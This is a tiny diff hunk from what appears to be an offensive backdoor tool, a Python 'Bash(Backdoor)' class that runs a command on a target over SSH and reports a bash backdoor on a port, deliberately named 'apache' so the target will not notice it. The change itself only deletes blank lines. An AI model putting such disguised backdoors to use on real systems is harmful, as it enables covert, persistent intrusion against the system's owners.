@@ -55,11 +55,3 @@ class Bash(Backdoor):
         self.target.ssh.exec_command(self.command)
         print("Bash backdoor on port %s attempted. It's named apache so the target won't see what's going on. If you stop the listener, the backdoor will stop." % port)
 
-
-
-
-
-
-
-
-
